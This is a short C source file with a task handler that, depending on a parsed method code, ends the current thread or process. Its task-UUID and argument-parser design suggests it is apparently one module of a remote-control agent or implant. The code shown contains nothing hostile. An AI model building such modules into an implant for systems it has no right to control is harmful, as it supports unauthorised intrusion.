#include "Tasks/Exit.h"

#include "Parser.h"
#include <processthreadsapi.h>

VOID Exit(PCHAR taskUuid, PPARSER arguments)
{
#define EXIT_THREAD   0
#define EXIT_PROCESS  1

    UINT32 nbArg = ParserGetInt32(arguments);
    if (nbArg != 1)
    {
        return;
    }

    UINT32 Method = ParserGetInt32(arguments);
    if (Method == EXIT_THREAD)
    {
        ExitThread(0);
    }
    else if (Method == EXIT_PROCESS)
    {
        ExitProcess(0);
    }
}